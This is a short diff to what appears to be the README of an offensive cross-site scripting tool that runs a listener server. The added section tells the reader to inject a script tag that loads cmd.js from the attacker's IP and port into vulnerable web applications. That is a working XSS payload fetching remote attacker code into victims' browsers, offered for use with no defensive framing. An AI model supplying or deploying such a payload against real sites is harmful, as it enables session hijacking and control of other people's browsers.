@@ -13,3 +13,8 @@ optional arguments:
   -h HOST, --host HOST  Server IP address (default: 0.0.0.0 - all interfaces)
   -p PORT, --port PORT  Server port (default: 4545)
 ```
+ ## Inject XSS Payload
+ Inject the following payload into vulnerable web applications:
+ ```bash
+<script src="http://YOUR_IP:YOUR_PORT/cmd.js"></script>
+```
